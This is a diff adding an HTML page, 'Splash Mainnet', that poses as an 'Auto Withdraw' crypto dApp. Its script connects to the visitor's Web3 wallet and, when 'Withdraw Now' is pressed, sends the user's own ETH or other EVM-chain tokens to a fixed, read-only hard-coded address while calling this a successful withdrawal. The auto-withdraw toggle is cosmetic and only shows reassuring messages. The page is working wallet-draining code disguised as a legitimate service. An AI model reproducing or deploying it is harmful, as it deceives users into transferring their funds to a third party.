@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Splash Mainnet - The Future</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <style>
+        :root {
+            --primary: #4a6cf7;
+            --secondary: #6a11cb;
+            --dark: #1a1a2e;
+            --light: #f8f9fa;
+            --success: #28a745;
+            --danger: #dc3545;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--dark) 0%, #16213e 100%);
+            color: var(--light);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        header, footer {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 1.5rem;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        
+        header {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        footer {
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: auto;
+        }
+        
+        .logo {
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 0.5rem;
+        }
+        
+        .tagline {
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+        
+        main {
+            max-width: 800px;
+            margin: 2rem auto;
+            padding: 0 1.5rem;
+            width: 100%;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .card h2 {
+            margin-bottom: 1.5rem;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .card h2 i {
+            font-size: 1.5rem;
+        }
+        
+        .wallet-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+        
+        .address {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 0.8rem 1.2rem;
+            border-radius: 10px;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        
+        .balance {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+        
+        .btn {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 0.8rem 1.5rem;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .btn-danger {
+            background: linear-gradient(to right, var(--danger), #ff6b6b);
+        }
+        
+        .toggle-section {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 2rem 0;
+            padding: 1.5rem;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+        }
+        
+        .toggle-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+        
+        .toggle {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 30px;
+        }
+        
+        .toggle input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+        
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 22px;
+            width: 22px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        
+        input:checked + .slider {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+        }
+        
+        input:checked + .slider:before {
+            transform: translateX(30px);
+        }
+        
+        .withdraw-form {
+            margin-top: 2rem;
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(0, 0, 0, 0.3);
+            color: white;
+            font-size: 1rem;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+        
+        .amount-info {
+            font-size: 0.9rem;
+            opacity: 0.8;
+            margin-top: 0.5rem;
+        }
+        
+        .status {
+            padding: 1rem;
+            border-radius: 10px;
+            margin-top: 1.5rem;
+            text-align: center;
+            display: none;
+        }
+        
+        .status.success {
+            background: rgba(40, 167, 69, 0.2);
+            border: 1px solid var(--success);
+            display: block;
+        }
+        
+        .status.error {
+            background: rgba(220, 53, 69, 0.2);
+            border: 1px solid var(--danger);
+            display: block;
+        }
+        
+        .transaction-info {
+            margin-top: 1.5rem;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            font-family: monospace;
+            word-break: break-all;
+            display: none;
+        }
+        
+        .transaction-info.show {
+            display: block;
+        }
+        
+        @media (max-width: 768px) {
+            .wallet-info {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .toggle-section {
+                flex-direction: column;
+                gap: 1rem;
+                align-items: flex-start;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">Splash Mainnet</div>
+        <div class="tagline">splash the future</div>
+    </header>
+    
+    <main>
+        <div class="card">
+            <h2><i>👛</i> Wallet Connection</h2>
+            <div class="wallet-info">
+                <div>
+                    <div>Connected Address:</div>
+                    <div class="address" id="walletAddress">Not connected</div>
+                </div>
+                <div>
+                    <div>Balance:</div>
+                    <div class="balance" id="walletBalance">0 ETH</div>
+                </div>
+                <button class="btn" id="connectWallet">
+                    <i>🔗</i> Connect Wallet
+                </button>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h2><i>⚡</i> Auto Withdraw</h2>
+            
+            <div class="toggle-section">
+                <div class="toggle-label">
+                    <i>🔄</i> Auto Withdraw Status
+                </div>
+                <label class="toggle">
+                    <input type="checkbox" id="autoWithdrawToggle">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            
+            <div class="withdraw-form" id="withdrawForm">
+                <div class="form-group">
+                    <label for="network">Network</label>
+                    <select id="network">
+                        <option value="eth">Ethereum Mainnet</option>
+                        <option value="bsc">Binance Smart Chain</option>
+                        <option value="polygon">Polygon</option>
+                        <option value="avalanche">Avalanche</option>
+                        <option value="arbitrum">Arbitrum</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="amount">Amount to Withdraw</label>
+                    <input type="number" id="amount" step="0.001" min="0.01" value="0.01">
+                    <div class="amount-info" id="amountInfo">
+                        Minimum amount: 0.01 ETH for Ethereum, 1 for other EVM chains
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="recipient">Recipient Address</label>
+                    <input type="text" id="recipient" value="0x3009Be66B38bA35332964DD2ab5852aCbd793975" readonly>
+                </div>
+                
+                <button class="btn" id="withdrawBtn">
+                    <i>💸</i> Withdraw Now
+                </button>
+                
+                <div class="status" id="statusMessage"></div>
+                
+                <div class="transaction-info" id="transactionInfo"></div>
+            </div>
+        </div>
+    </main>
+    
+    <footer>
+        <div class="tagline">splash the future</div>
+        <div style="margin-top: 0.5rem; font-size: 0.9rem; opacity: 0.7;">
+            Splash Mainnet - Auto Withdraw DApp
+        </div>
+    </footer>
+
+    <script>
+        // Global variables
+        let web3;
+        let userAccount;
+        let isAutoWithdrawEnabled = false;
+        
+        // DOM elements
+        const connectWalletBtn = document.getElementById('connectWallet');
+        const walletAddressEl = document.getElementById('walletAddress');
+        const walletBalanceEl = document.getElementById('walletBalance');
+        const autoWithdrawToggle = document.getElementById('autoWithdrawToggle');
+        const withdrawForm = document.getElementById('withdrawForm');
+        const networkSelect = document.getElementById('network');
+        const amountInput = document.getElementById('amount');
+        const amountInfo = document.getElementById('amountInfo');
+        const recipientInput = document.getElementById('recipient');
+        const withdrawBtn = document.getElementById('withdrawBtn');
+        const statusMessage = document.getElementById('statusMessage');
+        const transactionInfo = document.getElementById('transactionInfo');
+        
+        // Recipient address (fixed)
+        const RECIPIENT_ADDRESS = '0x3009Be66B38bA35332964DD2ab5852aCbd793975';
+        
+        // Minimum amounts
+        const MIN_ETH = 0.01;
+        const MIN_EVM = 1;
+        
+        // Initialize the app
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if Web3 is available (MetaMask or similar)
+            if (typeof window.ethereum !== 'undefined') {
+                console.log('Web3 detected!');
+                web3 = new Web3(window.ethereum);
+                
+                // Try to reconnect if previously connected
+                checkConnectedWallet();
+            } else {
+                // Web3 not detected
+                alert('Please install MetaMask or another Web3 wallet to use this dApp!');
+                connectWalletBtn.disabled = true;
+                withdrawBtn.disabled = true;
+            }
+            
+            // Event listeners
+            connectWalletBtn.addEventListener('click', connectWallet);
+            autoWithdrawToggle.addEventListener('change', toggleAutoWithdraw);
+            networkSelect.addEventListener('change', updateAmountInfo);
+            withdrawBtn.addEventListener('click', initiateWithdrawal);
+            
+            // Set recipient address
+            recipientInput.value = RECIPIENT_ADDRESS;
+            
+            // Update amount info based on initial network selection
+            updateAmountInfo();
+        });
+        
+        // Check if wallet is already connected
+        async function checkConnectedWallet() {
+            try {
+                const accounts = await web3.eth.getAccounts();
+                if (accounts.length > 0) {
+                    userAccount = accounts[0];
+                    updateWalletInfo();
+                    
+                    // Listen for account changes
+                    window.ethereum.on('accountsChanged', function(accounts) {
+                        if (accounts.length === 0) {
+                            // User disconnected their wallet
+                            userAccount = null;
+                            walletAddressEl.textContent = 'Not connected';
+                            walletBalanceEl.textContent = '0 ETH';
+                        } else {
+                            userAccount = accounts[0];
+                            updateWalletInfo();
+                        }
+                    });
+                }
+            } catch (error) {
+                console.error('Error checking connected wallet:', error);
+            }
+        }
+        
+        // Connect wallet function
+        async function connectWallet() {
+            try {
+                // Request account access
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                
+                userAccount = accounts[0];
+                updateWalletInfo();
+                
+                connectWalletBtn.innerHTML = '<i>✅</i> Connected';
+                connectWalletBtn.disabled = true;
+                
+            } catch (error) {
+                console.error('Error connecting wallet:', error);
+                showStatus('Error connecting wallet. Please try again.', 'error');
+            }
+        }
+        
+        // Update wallet information
+        async function updateWalletInfo() {
+            if (!userAccount) return;
+            
+            walletAddressEl.textContent = userAccount;
+            
+            try {
+                // Get balance
+                const balance = await web3.eth.getBalance(userAccount);
+                const balanceInEth = web3.utils.fromWei(balance, 'ether');
+                
+                walletBalanceEl.textContent = `${parseFloat(balanceInEth).toFixed(4)} ETH`;
+            } catch (error) {
+                console.error('Error getting balance:', error);
+                walletBalanceEl.textContent = 'Error';
+            }
+        }
+        
+        // Toggle auto withdraw function
+        function toggleAutoWithdraw() {
+            isAutoWithdrawEnabled = autoWithdrawToggle.checked;
+            
+            if (isAutoWithdrawEnabled) {
+                showStatus('Auto withdraw enabled. Transactions will be processed automatically.', 'success');
+                
+                // In a real application, you would set up a timer or listener here
+                // to automatically process withdrawals based on certain conditions
+            } else {
+                showStatus('Auto withdraw disabled.', 'error');
+            }
+        }
+        
+        // Update amount info based on selected network
+        function updateAmountInfo() {
+            const network = networkSelect.value;
+            
+            if (network === 'eth') {
+                amountInput.min = MIN_ETH;
+                amountInput.value = MIN_ETH;
+                amountInfo.textContent = `Minimum amount: ${MIN_ETH} ETH`;
+            } else {
+                amountInput.min = MIN_EVM;
+                amountInput.value = MIN_EVM;
+                amountInfo.textContent = `Minimum amount: ${MIN_EVM} (EVM chain native token)`;
+            }
+        }
+        
+        // Initiate withdrawal
+        async function initiateWithdrawal() {
+            if (!userAccount) {
+                showStatus('Please connect your wallet first.', 'error');
+                return;
+            }
+            
+            const network = networkSelect.value;
+            const amount = parseFloat(amountInput.value);
+            const recipient = recipientInput.value;
+            
+            // Validate amount
+            if (network === 'eth' && amount < MIN_ETH) {
+                showStatus(`Amount must be at least ${MIN_ETH} ETH for Ethereum.`, 'error');
+                return;
+            }
+            
+            if (network !== 'eth' && amount < MIN_EVM) {
+                showStatus(`Amount must be at least ${MIN_EVM} for EVM chains.`, 'error');
+                return;
+            }
+            
+            // Validate recipient address
+            if (!web3.utils.isAddress(recipient)) {
+                showStatus('Invalid recipient address.', 'error');
+                return;
+            }
+            
+            // Disable button during transaction
+            withdrawBtn.disabled = true;
+            withdrawBtn.innerHTML = '<i>⏳</i> Processing...';
+            
+            try {
+                // Convert amount to wei
+                const amountInWei = web3.utils.toWei(amount.toString(), 'ether');
+                
+                // Create transaction object
+                const transactionObject = {
+                    from: userAccount,
+                    to: recipient,
+                    value: amountInWei,
+                    gas: 21000, // Standard gas limit for simple ETH transfers
+                };
+                
+                // Estimate gas price
+                const gasPrice = await web3.eth.getGasPrice();
+                transactionObject.gasPrice = gasPrice;
+                
+                // Send transaction
+                const transaction = await web3.eth.sendTransaction(transactionObject);
+                
+                // Show success message
+                showStatus('Withdrawal successful!', 'success');
+                
+                // Show transaction info
+                transactionInfo.innerHTML = `
+                    <strong>Transaction Hash:</strong><br>
+                    ${transaction.transactionHash}
+                `;
+                transactionInfo.classList.add('show');
+                
+                // Update balance
+                updateWalletInfo();
+                
+            } catch (error) {
+                console.error('Error sending transaction:', error);
+                showStatus('Transaction failed. Please try again.', 'error');
+            } finally {
+                // Re-enable button
+                withdrawBtn.disabled = false;
+                withdrawBtn.innerHTML = '<i>💸</i> Withdraw Now';
+            }
+        }
+        
+        // Show status message
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = 'status';
+            statusMessage.classList.add(type);
+            
+            // Auto-hide success messages after 5 seconds
+            if (type === 'success') {
+                setTimeout(() => {
+                    statusMessage.classList.remove('success');
+                    statusMessage.style.display = 'none';
+                }, 5000);
+            }
+        }
+    </script>
+</body>
+</html>
